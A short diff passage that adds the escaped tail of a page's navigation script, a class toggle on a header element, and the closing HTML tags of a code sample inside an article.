+          headerEl.classList.toggle(&#039;nav-open&#039;);
+        });
+      }
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+      </div>
+    </article>
+  
